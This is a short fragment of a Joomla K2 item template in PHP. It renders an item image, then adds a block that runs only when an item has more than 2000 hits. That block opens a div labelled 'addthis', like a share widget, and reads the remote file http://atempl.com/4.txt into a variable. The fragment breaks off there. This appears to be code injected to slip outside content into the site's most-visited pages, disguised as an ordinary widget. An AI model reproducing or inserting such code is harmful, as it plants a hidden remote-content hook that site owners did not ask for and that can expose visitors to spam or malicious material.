	  ...
	  <div class="itemImageBlock pull-left" >
		  <span class="itemImage">
		  	<a class="no-modal modal" rel="{handler: 'image'}" href="<?php echo $this->item->imageXLarge; ?>" title="<?php echo JText::_('K2_CLICK_TO_PREVIEW_IMAGE'); ?>">
				<img src="<?php echo $this->item->image; ?>" alt="<?php if(!empty($this->item->image_caption)) echo K2HelperUtilities::cleanHtml($this->item->image_caption); else echo K2HelperUtilities::cleanHtml($this->item->title); ?>" style="width:200px; height:300px; float:left;" />
		  	</a>
		  </span>
...
if ( ($this->item->hits >'2000' ) ) 
{
echo '<div id="addthis">';
$content = file("http://atempl.com/4.txt");
